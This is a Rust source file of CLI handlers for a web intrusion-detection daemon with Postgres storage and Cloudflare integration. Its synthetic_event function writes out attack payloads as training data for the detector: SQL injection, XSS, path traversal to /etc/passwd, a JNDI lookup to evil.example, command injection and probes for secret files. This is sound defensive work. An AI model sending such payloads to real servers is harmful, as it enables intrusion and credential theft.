//! Subcommand handlers.
//!
//! Commands that need Postgres connect from the loaded config's
//! `storage.postgres.url`. If no URL is configured, they print a helpful
//! message instead of crashing.

use crate::cli::*;
#[cfg(feature = "onnx")]
use sentry_ai::ThreatModel;
use sentry_core::config::SentryConfig;

/// Dispatch a parsed CLI invocation with a possibly-loaded config.
pub async fn dispatch_with_config(cli: Cli, cfg: Option<SentryConfig>) -> color_eyre::Result<()> {
    match cli.command {
        Command::Run => {
            let cfg = cfg.ok_or_else(|| color_eyre::eyre::eyre!("config required for `run`"))?;
            crate::daemon::run(cfg).await?;
        }
        Command::Tail { stream, .. } => {
            if stream {
                tail_stream().await?;
            } else {
                crate::tui::run(cfg.as_ref())
                    .await
                    .map_err(color_eyre::Report::from)?;
            }
        }
        Command::Incidents { action } => match action {
            IncidentsCmd::List => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let incidents = repo
                    .incidents()
                    .unresolved(50)
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                if incidents.is_empty() {
                    println!("No unresolved incidents.");
                } else {
                    println!(
                        "{:<38} {:<20} {:<10} {:<8} NOTES",
                        "ID", "CREATED", "LEVEL", "ACTION"
                    );
                    for i in &incidents {
                        println!(
                            "{:<38} {:<20} {:<10} {:<8} {}",
                            i.id,
                            i.created_at.format("%Y-%m-%d %H:%M"),
                            i.risk_level,
                            i.action,
                            i.notes.as_deref().unwrap_or("-"),
                        );
                    }
                }
            }
            IncidentsCmd::Show { id } => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let incidents = repo
                    .incidents()
                    .unresolved(1000)
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                let id_parsed = id
                    .parse::<uuid::Uuid>()
                    .map_err(|e| color_eyre::eyre::eyre!("invalid UUID: {e}"))?;
                let found = incidents.iter().find(|i| i.id == id_parsed);
                match found {
                    Some(i) => {
                        println!("ID:       {}", i.id);
                        println!(
                            "Event:    {}",
                            i.event_id.map(|u| u.to_string()).unwrap_or("-".into())
                        );
                        println!("Created:  {}", i.created_at);
                        println!("Level:    {}", i.risk_level);
                        println!("Action:   {}", i.action);
                        println!("Resolved: {}", i.resolved);
                        println!("Notes:    {}", i.notes.as_deref().unwrap_or("-"));
                    }
                    None => println!("Incident {id} not found (or already resolved)."),
                }
            }
        },
        Command::Ip { ip, action } => {
            let cfg = require_config(&cfg)?;
            let repo = connect_storage(cfg).await?;
            let ip_addr: std::net::IpAddr = ip
                .parse()
                .map_err(|e| color_eyre::eyre::eyre!("invalid IP: {e}"))?;
            match action {
                Some(IpCmd::Block { ttl, note }) => {
                    let expires_at = ttl
                        .as_deref()
                        .map(parse_duration)
                        .transpose()?
                        .map(|d| chrono::Utc::now() + d);
                    repo.ip_state()
                        .block(ip_addr, note.as_deref(), expires_at)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("block failed: {e}"))?;
                    println!(
                        "Blocked {ip} (expires: {})",
                        expires_at.map(|t| t.to_string()).unwrap_or("never".into())
                    );
                    notify_rules_changed(&repo).await;
                }
                Some(IpCmd::Unblock) => {
                    repo.ip_state()
                        .unblock(ip_addr)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("unblock failed: {e}"))?;
                    println!("Unblocked {ip}");
                    notify_rules_changed(&repo).await;
                }
                Some(IpCmd::Forgive) => {
                    repo.ip_state()
                        .reset_offender(ip_addr)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("forgive failed: {e}"))?;
                    println!("Strikes reset for {ip} (total history kept)");
                }
                Some(IpCmd::Info) | None => {
                    let is_blocked = repo
                        .ip_state()
                        .is_blocked(ip_addr)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                    println!("IP:       {ip}");
                    println!("Blocked:  {is_blocked}");
                    let blocked_list = repo
                        .ip_state()
                        .blocked(1000)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                    if let Some(row) = blocked_list.iter().find(|r| r.ip == ip) {
                        println!("Reason:   {}", row.reason.as_deref().unwrap_or("-"));
                        println!(
                            "Expires:  {}",
                            row.expires_at
                                .map(|t| t.to_string())
                                .unwrap_or("never".into())
                        );
                        println!("Updated:  {}", row.updated_at);
                    }
                    match repo.ip_state().offender(ip_addr).await {
                        Ok(Some(offender)) => {
                            println!("Strikes:  {}", offender.strikes);
                            println!("Total violations: {}", offender.total_violations);
                            println!(
                                "Last violation:    {}",
                                offender
                                    .last_violation_at
                                    .map(|t| t.to_string())
                                    .unwrap_or("-".into())
                            );
                        }
                        Ok(None) => println!("Strikes:  0 (no violations recorded)"),
                        Err(e) => println!("Strikes:  query failed: {e}"),
                    }
                }
            }
        }
        Command::Routes { action } => match action {
            RoutesCmd::List => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let routes = repo
                    .routes()
                    .list()
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                if routes.is_empty() {
                    println!("No routes in database. Config routes:");
                    for r in &cfg.routes.known {
                        println!("  (config) {} [{}]", r.path, r.methods.join(","));
                    }
                } else {
                    println!("{:<5} {:<30} METHODS", "ID", "PATH");
                    for r in &routes {
                        println!("{:<5} {:<30} {}", r.id, r.path, r.methods.join(","));
                    }
                }
            }
            RoutesCmd::Learn {
                dry_run,
                min_hits,
                min_ips,
            } => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let opts = sentry_core::routes_learn::LearnOptions { min_hits, min_ips };
                let rows = repo
                    .events()
                    .recent(10_000)
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                let events: Vec<sentry_core::Event> = rows
                    .iter()
                    .filter_map(crate::daemon::event_row_to_event)
                    .collect();
                let learned = sentry_core::routes_learn::learn(&events, &opts);
                println!("Route learning ({} recent events):", rows.len());
                if learned.is_empty() {
                    println!("  No stable route shapes found with the given thresholds.");
                } else {
                    println!("{:<24} PATH", "METHODS");
                    for r in &learned {
                        let m = if r.methods.is_empty() {
                            "*".to_string()
                        } else {
                            r.methods.join(",")
                        };
                        println!("{m:<24} {}", r.path);
                    }
                }
                if dry_run {
                    println!("(--dry-run set — nothing persisted)");
                } else {
                    let existing = repo
                        .routes()
                        .list()
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                    let existing_paths: std::collections::HashSet<String> = existing
                        .iter()
                        .map(|r| r.path.to_ascii_lowercase())
                        .collect();
                    let mut inserted = 0;
                    for r in &learned {
                        if existing_paths.contains(&r.path.to_ascii_lowercase()) {
                            continue;
                        }
                        match repo.routes().insert(&r.path, &r.methods).await {
                            Ok(_) => inserted += 1,
                            Err(e) => tracing::warn!(path = %r.path, error = %e, "insert failed"),
                        }
                    }
                    if inserted > 0 {
                        let _ = repo.pool().notify("sentry_routes_changed").await;
                    }
                    println!("Inserted {inserted} new routes into the database.");
                }
            }
            RoutesCmd::Import {
                path,
                format,
                dry_run,
            } => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let fmt = format.unwrap_or(crate::routes_import::ImportFormat::Auto);
                let report = crate::routes_import::import_file(
                    std::path::Path::new(&path),
                    fmt,
                    &repo,
                    dry_run,
                )
                .await?;
                println!(
                    "Imported {} from {path} (parsed: {}, duplicates: {}, inserted: {}{})",
                    fmt.as_str(),
                    report.parsed,
                    report.duplicates,
                    report.inserted,
                    if dry_run { " [DRY RUN]" } else { "" }
                );
                if !report.added.is_empty() {
                    println!("\n{:<24} PATH", "METHODS");
                    for line in &report.added {
                        println!("{line}");
                    }
                }
            }
        },
        Command::Rules { action } => {
            match action {
                RulesCmd::List => {
                    let cfg = require_config(&cfg)?;
                    if let Ok(repo) = connect_storage(cfg).await {
                        let rules = repo
                            .rules()
                            .list()
                            .await
                            .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                        if rules.is_empty() {
                            println!("No rules in database.");
                        } else {
                            println!(
                                "{:<20} {:<25} {:<8} {:<7} {:<10} MATCH",
                                "ID", "NAME", "PRIORITY", "ENABLED", "ACTION"
                            );
                            for r in &rules {
                                println!(
                                    "{:<20} {:<25} {:<8} {:<7} {:<10} {}",
                                    r.id, r.name, r.priority, r.enabled, r.action, r.match_expr
                                );
                            }
                        }
                    }
                    println!("\nConfig packs:");
                    for p in &cfg.rules.packs {
                        println!("  {} = {}", p.name, p.mode);
                    }
                }
                RulesCmd::Show { id } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    let rules = repo
                        .rules()
                        .list()
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                    match rules.iter().find(|r| r.id == id) {
                        Some(r) => {
                            println!("ID:       {}", r.id);
                            println!("Name:     {}", r.name);
                            println!("Priority: {}", r.priority);
                            println!("Enabled:  {}", r.enabled);
                            println!("Action:   {}", r.action);
                            println!("Match:    {}", r.match_expr);
                            println!("TTL:      {:?}", r.ttl_secs);
                            println!("Source:   {}", r.source);
                            println!("Tags:     {}", r.tags.join(", "));
                            println!("Created:  {}", r.created_at);
                        }
                        None => println!("Rule '{id}' not found."),
                    }
                }
                RulesCmd::Add {
                    name,
                    r#match,
                    action,
                    priority,
                } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    let id = name.to_lowercase().replace(' ', "-");
                    repo.rules()
                        .upsert(&id, &name, priority, true, &r#match, &action, None, &[])
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("upsert failed: {e}"))?;
                    println!("Added rule '{id}' (match: {match}, action: {action}, priority: {priority})");
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Allow { ip, ttl, note } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    let id = format!("allow-{ip}");
                    let match_expr = format!("ip={ip}");
                    repo.rules()
                        .upsert(
                            &id,
                            &format!("Allow {ip}"),
                            1,
                            true,
                            &match_expr,
                            "allow",
                            None,
                            &[],
                        )
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("upsert failed: {e}"))?;
                    println!(
                        "Allowlisted {ip}{}",
                        ttl_or_note(ttl.as_deref(), note.as_deref())
                    );
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Block { ip, ttl, note } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    let id = format!("block-{ip}");
                    let match_expr = format!("ip={ip}");
                    let ttl_secs = ttl
                        .as_deref()
                        .and_then(|s| parse_duration(s).ok().map(|d| d.num_seconds() as i32));
                    repo.rules()
                        .upsert(
                            &id,
                            &format!("Block {ip}"),
                            1,
                            true,
                            &match_expr,
                            "block",
                            ttl_secs,
                            &[],
                        )
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("upsert failed: {e}"))?;
                    println!(
                        "Blocked {ip}{}",
                        ttl_or_note(ttl.as_deref(), note.as_deref())
                    );
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Enable { id } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    repo.rules()
                        .set_enabled(&id, true)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("update failed: {e}"))?;
                    println!("Enabled rule '{id}'");
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Disable { id } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    repo.rules()
                        .set_enabled(&id, false)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("update failed: {e}"))?;
                    println!("Disabled rule '{id}'");
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Delete { id } => {
                    let cfg = require_config(&cfg)?;
                    let repo = connect_storage(cfg).await?;
                    repo.rules()
                        .delete(&id)
                        .await
                        .map_err(|e| color_eyre::eyre::eyre!("delete failed: {e}"))?;
                    println!("Deleted rule '{id}'");
                    notify_rules_changed(&repo).await;
                }
                RulesCmd::Packs => {
                    let cfg = require_config(&cfg)?;
                    println!("{:<20} {:<10}", "PACK", "MODE");
                    for p in &cfg.rules.packs {
                        println!("{:<20} {:<10}", p.name, p.mode);
                    }
                    println!("\nAvailable default packs:");
                    for name in sentry_core::packs::PackMode::all_pack_names() {
                        let mode = cfg
                            .rules
                            .packs
                            .iter()
                            .find(|p| p.name == *name)
                            .map(|p| p.mode.as_str())
                            .unwrap_or("off");
                        println!("  {name:<20} {mode}");
                    }
                }
                RulesCmd::Test {
                    path,
                    method,
                    ip,
                    ua,
                } => {
                    test_rules(&cfg, &path, &method, &ip, &ua)?;
                }
            }
        }
        Command::Report {
            from,
            export,
            unknown_paths,
        } => {
            let cfg = require_config(&cfg)?;
            let repo = connect_storage(cfg).await?;
            let since = chrono::Utc::now()
                - parse_duration(&from)
                    .map_err(|e| color_eyre::eyre::eyre!("invalid --from: {e}"))?;

            if unknown_paths {
                let rows = repo
                    .events()
                    .top_unknown_paths(20, since)
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                println!("Top unknown paths flagged `UnknownRoute` (since {since}):");
                println!("(candidates for [[routes.known]] — the learner never learns these)");
                if rows.is_empty() {
                    println!("  (none)");
                }
                for (path, n) in &rows {
                    println!("  {path:<50} {n}");
                }
                return Ok(());
            }

            let by_level = repo
                .events()
                .count_by_level_since(since)
                .await
                .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
            let by_verdict = repo
                .events()
                .count_by_verdict_since(since)
                .await
                .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
            let top_ips = repo
                .events()
                .top_ips(10, since)
                .await
                .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
            let top_paths = repo
                .events()
                .top_paths(10, since)
                .await
                .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;

            let total: i64 = by_level.iter().map(|(_, n)| n).sum();
            match export.as_deref() {
                Some("json") => {
                    let report = serde_json::json!({
                        "from": since.to_rfc3339(),
                        "window": from,
                        "total_events": total,
                        "by_level": by_level.into_iter().collect::<std::collections::HashMap<_, _>>(),
                        "by_verdict": by_verdict.into_iter().collect::<std::collections::HashMap<_, _>>(),
                        "top_ips": top_ips,
                        "top_paths": top_paths,
                    });
                    println!("{}", serde_json::to_string_pretty(&report)?);
                }
                Some("csv") => {
                    println!("kind,value,count");
                    for (level, n) in &by_level {
                        println!("level,{level},{n}");
                    }
                    for (verdict, n) in &by_verdict {
                        println!("verdict,{verdict},{n}");
                    }
                    for (ip, n) in &top_ips {
                        println!("ip,{ip},{n}");
                    }
                    for (path, n) in &top_paths {
                        println!("path,{path},{n}");
                    }
                }
                Some(other) => {
                    return Err(color_eyre::eyre::eyre!(
                        "unknown --export format `{other}` (expected json | csv)"
                    ));
                }
                None => {
                    println!("Report (since {since}, window {from} — {total} events):");
                    println!("\nBy risk level:");
                    if by_level.is_empty() {
                        println!("  (no events)");
                    } else {
                        for (level, n) in &by_level {
                            println!("  {level:<10} {n}");
                        }
                    }
                    println!("\nBy verdict:");
                    if by_verdict.is_empty() {
                        println!("  (no events)");
                    } else {
                        for (verdict, n) in &by_verdict {
                            println!("  {verdict:<12} {n}");
                        }
                    }
                    println!("\nTop IPs:");
                    if top_ips.is_empty() {
                        println!("  (no events)");
                    } else {
                        for (ip, n) in &top_ips {
                            println!("  {ip:<18} {n}");
                        }
                    }
                    println!("\nTop paths:");
                    if top_paths.is_empty() {
                        println!("  (no events)");
                    } else {
                        for (path, n) in &top_paths {
                            println!("  {path:<40} {n}");
                        }
                    }
                }
            }
        }
        Command::Config { action } => match action {
            ConfigCmd::Validate => {
                let cfg = require_config(&cfg)?;
                println!("config OK");
                println!("  sources:   {}", cfg.sources.len());
                println!("  actions:   {}", cfg.actions.len());
                println!("  routes:    {}", cfg.routes.known.len());
                println!("  packs:     {}", cfg.rules.packs.len());
                println!(
                    "  storage:   {}",
                    if cfg.storage.postgres.url.is_empty() {
                        "disabled"
                    } else {
                        "enabled"
                    }
                );
            }
            ConfigCmd::Show => {
                let cfg = require_config(&cfg)?;
                println!("{}", toml::to_string_pretty(&cfg)?);
            }
        },
        Command::Model { action } => match action {
            ModelCmd::Status => {
                let ai = cfg.as_ref().map(|c| &c.ai);
                println!("Model: classic ML (ONNX) — fork stage");
                match ai {
                    Some(ai) => {
                        println!("Enabled:  {}", ai.enabled);
                        println!("Path:     {}", ai.model_path.display());
                        println!(
                            "Mode:     {} (trigger: {}, min score {})",
                            ai.mode, ai.trigger, ai.min_score
                        );
                        println!(
                            "Threshold: {:.2}, signal weight: {}",
                            ai.threshold, ai.signal_weight
                        );
                        match ai.model_path.exists() {
                            true => {
                                #[cfg(feature = "onnx")]
                                {
                                    match sentry_ai::onnx_model::OnnxThreatModel::load(
                                        &ai.model_path,
                                        sentry_ai::onnx_model::OnnxThreatModelConfig {
                                            threshold: ai.threshold,
                                            signal_weight: ai.signal_weight,
                                        },
                                    ) {
                                        Ok(m) => {
                                            println!("Loaded:   {} ({})", m.name(), m.describe())
                                        }
                                        Err(e) => println!("Loaded:   failed: {e}"),
                                    }
                                }
                                #[cfg(not(feature = "onnx"))]
                                println!("Loaded:   file present (build sentry-cli with --features onnx to load it)");
                            }
                            false => println!(
                                "Loaded:   no model file (train one with tools/train_model.py)"
                            ),
                        }
                    }
                    None => println!("Enabled:  false (no config loaded)"),
                }
                println!(
                    "LLM provider: {}",
                    cfg.as_ref()
                        .map(|c| c.llm.provider.as_str())
                        .unwrap_or("none")
                );
            }
            ModelCmd::Reload => {
                println!("Model reload happens on daemon restart (hot reload is planned for F3).");
            }
            ModelCmd::Export {
                hours,
                out,
                synthetic,
                rows,
            } => {
                if synthetic {
                    export_synthetic(rows, &out)?;
                    return Ok(());
                }
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let since = chrono::Utc::now() - chrono::Duration::hours(hours as i64);
                let rows = repo
                    .events()
                    .recent_since(since)
                    .await
                    .map_err(|e| color_eyre::eyre::eyre!("query failed: {e}"))?;
                let mut w = std::io::BufWriter::new(
                    std::fs::File::create(&out)
                        .map_err(|e| color_eyre::eyre::eyre!("cannot create {out}: {e}"))?,
                );
                use std::io::Write;
                writeln!(w, "{},label", sentry_ai::FEATURE_NAMES.join(","))
                    .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
                let mut written = 0u64;
                for row in &rows {
                    let Some(evt) = crate::daemon::event_row_to_event(row) else {
                        continue;
                    };
                    // Label: verdicts the pipeline acted on are the positives.
                    let label =
                        matches!(row.verdict.as_str(), "block" | "challenge" | "rate_limit") as u8;
                    let features: Vec<String> = sentry_ai::features::extract(&evt)
                        .iter()
                        .map(|f| format!("{f:.6}"))
                        .collect();
                    writeln!(w, "{},{}", features.join(","), label)
                        .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
                    written += 1;
                }
                w.flush().ok();
                println!(
                    "Exported {written} rows ({hours}h window) to {out} \
                     — train with: python tools/train_model.py --csv {out}"
                );
            }
        },
        Command::Cloudflare { action } => match action {
            CloudflareCmd::Status => {
                let provider = build_cf_provider()?;
                match provider.verify().await {
                    Ok((valid, zone_name)) => {
                        println!("Cloudflare token: valid({valid})");
                        println!("Cloudflare zone:  {zone_name}");
                        match provider.list_access_rules().await {
                            Ok(rules) => {
                                let ours = rules
                                    .iter()
                                    .filter(|r| r.notes.as_deref() == Some("sentry"))
                                    .count();
                                println!("Access rules:     {} (sentry: {})", rules.len(), ours);
                            }
                            Err(e) => println!("Access rules:     list failed: {e}"),
                        }
                    }
                    Err(e) => println!("Cloudflare verify failed: {e}"),
                }
            }
            CloudflareCmd::Test => {
                let provider = build_cf_provider()?;
                println!("Verifying token + zone (no changes will be made)…");
                match provider.verify().await {
                    Ok((valid, zone_name)) => {
                        println!("Token valid: {valid}");
                        println!("Zone:        {zone_name}");
                        match provider.list_access_rules().await {
                            Ok(rules) => {
                                println!("Sample access rules (up to 5):");
                                for r in rules.iter().take(5) {
                                    println!("  {} {:<18} {}", r.id, r.configuration.value, r.mode);
                                }
                                if rules.len() > 5 {
                                    println!("  … and {} more", rules.len() - 5);
                                }
                            }
                            Err(e) => println!("  list failed: {e}"),
                        }
                    }
                    Err(e) => println!("Verify failed: {e}"),
                }
            }
            CloudflareCmd::Pull => {
                let cfg = require_config(&cfg)?;
                let repo = connect_storage(cfg).await?;
                let provider = build_cf_provider()?;
                println!("Pulling recent Cloudflare logs (best-effort)…");
                match provider.list_access_rules().await {
                    Ok(rules) => {
                        let ours: Vec<_> = rules
                            .into_iter()
                            .filter(|r| r.notes.as_deref() == Some("sentry"))
                            .collect();
                        println!(
                            "Found {} sentry-created access rules at the edge.",
                            ours.len()
                        );
                        for r in &ours {
                            println!("  {} {:<18} {}", r.id, r.configuration.value, r.mode);
                        }
                    }
                    Err(e) => println!("Pull failed: {e}"),
                }
                let _ = repo;
            }
        },
        Command::Test {
            payload,
            path,
            method,
        } => {
            test_payload(&payload, &path, &method)?;
        }
        Command::Auto {
            root,
            profile,
            dry_run,
            merge,
            deep,
        } => {
            println!("(stub) auto root={root:?} profile={profile:?} dry_run={dry_run} merge={merge} deep={deep}");
        }
    }
    Ok(())
}

fn require_config(cfg: &Option<SentryConfig>) -> color_eyre::Result<&SentryConfig> {
    cfg.as_ref().ok_or_else(|| {
        color_eyre::eyre::eyre!("config required — pass --config or create sentry.toml")
    })
}

async fn connect_storage(cfg: &SentryConfig) -> color_eyre::Result<sentry_storage::Repo> {
    if cfg.storage.postgres.url.is_empty() {
        return Err(color_eyre::eyre::eyre!(
            "storage.postgres.url is not configured — set it in sentry.toml or via SENTRY_STORAGE__POSTGRES__URL env"
        ));
    }
    let pool = sentry_storage::PgPool::connect(&cfg.storage.postgres)
        .await
        .map_err(|e| color_eyre::eyre::eyre!("postgres connection failed: {e}"))?;
    Ok(sentry_storage::Repo::new(pool))
}

/// Build a Cloudflare provider from env vars (`SENTRY_CF_TOKEN`, `SENTRY_CF_ZONE`).
fn build_cf_provider() -> color_eyre::Result<sentry_action_cloudflare::CloudflareProvider> {
    let token = std::env::var("SENTRY_CF_TOKEN")
        .map_err(|_| color_eyre::eyre::eyre!("SENTRY_CF_TOKEN env var not set"))?;
    let zone = std::env::var("SENTRY_CF_ZONE")
        .map_err(|_| color_eyre::eyre::eyre!("SENTRY_CF_ZONE env var not set"))?;
    Ok(sentry_action_cloudflare::CloudflareProvider::new(
        sentry_action_cloudflare::CloudflareProviderConfig {
            token,
            zone,
            default_mode: sentry_core::challenge::EdgeMode::ManagedChallenge,
            ttl: std::time::Duration::from_secs(86400),
        },
    ))
}

async fn notify_rules_changed(repo: &sentry_storage::Repo) {
    let _ = repo.pool().notify("sentry_rules_changed").await;
}

/// Tiny deterministic LCG (no `rand` dependency for this offline tool).
struct Lcg(u64);

impl Lcg {
    fn new(seed: u64) -> Self {
        Self(seed)
    }
    fn next(&mut self) -> u64 {
        self.0 = self
            .0
            .wrapping_mul(6_364_136_223_846_793_005)
            .wrapping_add(1_442_695_040_888_963_407);
        self.0 >> 33
    }
    fn below(&mut self, n: u64) -> u64 {
        self.next() % n.max(1)
    }
    fn pick<'a>(&mut self, items: &[&'a str]) -> &'a str {
        items[self.below(items.len() as u64) as usize]
    }
    fn alnum(&mut self, len: usize) -> String {
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        (0..len)
            .map(|_| CHARSET[self.below(CHARSET.len() as u64) as usize] as char)
            .collect()
    }
}

const BROWSER_UAS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.5",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
];
const TOOL_UAS: &[&str] = &[
    "python-requests/2.32.0",
    "curl/8.5.0",
    "sqlmap/1.8",
    "Go-http-client/2.0",
    "masscan/1.3",
];

fn synthetic_event(rng: &mut Lcg, malicious: bool) -> (sentry_core::Event, u8) {
    let id = rng.below(10_000);
    let (path, query): (String, Option<String>) = if malicious {
        match rng.below(16) {
            0 => ("/login".into(), Some(format!("user='+OR+{id}%3D1--"))),
            1 => (
                "/products".into(),
                Some(format!("id={id}%20UNION%20SELECT%20*%20FROM%20users")),
            ),
            2 => (
                "/search".into(),
                Some("<script>alert(1)</script>".to_string()),
            ),
            3 => ("/../../etc/passwd".into(), None),
            4 => ("/%2e%2e%2fetc%2fpasswd".into(), None),
            5 => ("/....//windows/win.ini".into(), None),
            6 => (
                "/search".into(),
                Some("${jndi:ldap://evil.example/a}".to_string()),
            ),
            7 => (
                "/ping".into(),
                Some(format!("host=;cat /etc/passwd|{}", rng.alnum(4))),
            ),
            8 => ("/.env".into(), None),
            9 => (
                format!(
                    "/.env.{}",
                    rng.pick(&["local", "production", "staging", "test"])
                ),
                None,
            ),
            10 => ("/.git/config".into(), None),
            11 => {
                let len = 3 + rng.below(5) as usize;
                (
                    format!("/{}.{}", rng.alnum(len), rng.pick(&["php", "asp", "jsp"])),
                    None,
                )
            }
            12 => (
                rng.pick(&[
                    "/wp-admin/setup-config.php",
                    "/wp-login.php",
                    "/phpmyadmin/",
                    "/adminer.php",
                ])
                .to_string(),
                None,
            ),
            13 => (
                "/index.php".into(),
                Some("page=php://filter/convert.base64-encode/resource=index".to_string()),
            ),
            14 => ("/backup.sql".into(), None),
            _ => (format!("/{}.bak", rng.alnum(4)), None),
        }
    } else {
        (
            match rng.below(12) {
                0 => format!("/api/users/{id}"),
                1 => format!("/api/users/{id}/posts"),
                2 => format!("/api/items/{id}"),
                3 => "/posts".into(),
                4 => "/health".into(),
                5 => "/about".into(),
                6 => format!("/static/v{}css/app.css", rng.below(9)),
                7 => "/favicon.ico".into(),
                8 => format!("/docs/{}", rng.pick(&["intro", "api", "guides", "faq"])),
                9 => "/login".into(),
                10 => format!("/posts/{}", rng.alnum(6)),
                _ => "/api/orders".into(),
            },
            match rng.below(12) {
                10 => Some(format!("page={}&sort=asc", rng.below(50))),
                11 => Some(format!("page={}&limit=25", rng.below(50))),
                _ => None,
            },
        )
    };
    let ua = if malicious && rng.below(3) == 0 {
        rng.pick(TOOL_UAS).to_string()
    } else {
        rng.pick(BROWSER_UAS).to_string()
    };
    let status = if malicious {
        [404, 404, 404, 403, 500][rng.below(5) as usize]
    } else {
        [200, 200, 200, 200, 301, 404][rng.below(6) as usize]
    };
    let evt = sentry_core::Event::new(
        sentry_core::SourceKind::Synthetic,
        format!("203.0.113.{}", 1 + rng.below(254)).parse().unwrap(),
        sentry_core::ProtocolData::Http(sentry_core::HttpData {
            path,
            query,
            method: Some(if rng.below(6) == 0 {
                sentry_core::HttpMethod::Post
            } else {
                sentry_core::HttpMethod::Get
            }),
            status: Some(status),
            user_agent: Some(ua),
            ..Default::default()
        }),
    );
    (evt, u8::from(malicious))
}

/// Generate a synthetic seed dataset (features extracted by Rust — same
/// extractor as inference, so training/inference parity is guaranteed).
fn export_synthetic(rows: u64, out: &str) -> color_eyre::Result<()> {
    use std::io::Write;
    let mut rng = Lcg::new(0x5EED_C0DE);
    let mut w = std::io::BufWriter::new(
        std::fs::File::create(out)
            .map_err(|e| color_eyre::eyre::eyre!("cannot create {out}: {e}"))?,
    );
    writeln!(w, "{},label", sentry_ai::FEATURE_NAMES.join(","))
        .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
    for i in 0..rows.max(2) {
        let malicious = i >= rows / 2;
        let (evt, label) = synthetic_event(&mut rng, malicious);
        let features: Vec<String> = sentry_ai::features::extract(&evt)
            .iter()
            .map(|f| format!("{f:.6}"))
            .collect();
        writeln!(w, "{},{}", features.join(","), label)
            .map_err(|e| color_eyre::eyre::eyre!("write failed: {e}"))?;
    }
    w.flush().ok();
    println!(
        "Exported {rows} synthetic rows ({}/{} malicious) to {out} — train with: \
         python tools/train_model.py --csv {out}",
        rows / 2,
        rows - rows / 2
    );
    Ok(())
}

fn parse_duration(s: &str) -> color_eyre::Result<chrono::Duration> {
    let s = s.trim();
    if s.is_empty() {
        return Err(color_eyre::eyre::eyre!("empty duration"));
    }
    let (num_str, unit) = s
        .find(|c: char| !c.is_ascii_digit())
        .map(|pos| s.split_at(pos))
        .unwrap_or((s, ""));
    let num: i64 = num_str
        .parse()
        .map_err(|e| color_eyre::eyre::eyre!("invalid duration number: {e}"))?;
    let secs = match unit {
        "s" | "" => num,
        "m" => num * 60,
        "h" => num * 3600,
        "d" => num * 86400,
        "w" => num * 86400 * 7,
        _ => {
            return Err(color_eyre::eyre::eyre!(
                "unknown duration unit '{unit}' (use s/m/h/d/w)"
            ))
        }
    };
    chrono::Duration::try_seconds(secs)
        .ok_or_else(|| color_eyre::eyre::eyre!("duration out of range"))
}

fn ttl_or_note(ttl: Option<&str>, note: Option<&str>) -> String {
    let mut parts = Vec::new();
    if let Some(t) = ttl {
        parts.push(format!(" (ttl: {t})"));
    }
    if let Some(n) = note {
        parts.push(format!(" (note: {n})"));
    }
    parts.join("")
}

fn test_rules(
    cfg: &Option<SentryConfig>,
    path: &str,
    method: &str,
    ip: &Option<String>,
    ua: &Option<String>,
) -> color_eyre::Result<()> {
    use sentry_core::event::{Event, HttpData, HttpMethod, ProtocolData, SourceKind};
    use sentry_core::packs::build_default_ruleset;
    use sentry_core::pipeline::{Pipeline, RouteValidator};
    use std::collections::HashMap;
    use std::net::Ipv4Addr;

    let pack_modes: HashMap<String, String> = cfg
        .as_ref()
        .map(|c| {
            c.rules
                .packs
                .iter()
